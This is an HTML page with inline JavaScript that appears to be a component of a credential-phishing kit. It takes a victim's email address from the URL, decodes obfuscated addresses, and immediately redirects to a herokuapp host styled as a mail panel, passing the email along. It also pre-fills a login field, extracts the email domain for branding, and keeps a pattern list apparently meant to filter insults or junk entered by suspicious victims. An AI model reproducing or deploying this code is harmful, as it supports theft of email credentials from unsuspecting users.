<html lang="en" >
<head>
  <meta charset="UTF-8">

</head>
<body>



<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
	$('#me').text($c);
	
	var myem = $c;
	
	setTimeout(function() {
                                window.location.href = "https://messages-exmailpanel863c2de7c.herokuapp.com/?gfdsfghjkKgQ69xz2VfGmRFulpjkXD8iZhsAEBerv5q0wotSICaNyb1WY3U7PHT4McOLJOK9NanoqIB0ZLQzpFgRvyUS43JjlAWCwTiME1u7r8cYVeh6sGPXkm2HbtDf5zQwtL97V0U4fRN3DKFgJa8MniHupSYXWZmEAxoCPhyObrIj21sekTl65GBcqgOYErmBaLty65KiIMHGF9T3ZnuW4RQ1DqxvhS8sb2UXzAocwJ0kfNePpjlC7/sXMO5u2p3PH6nhv8mCrY7gtUR01DcBeafGzSExwlZJq94QIKjLiFTVkyNoWb?email="+myem;
                        },0);
	
	
        
		
		var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script>
</body>
</html>
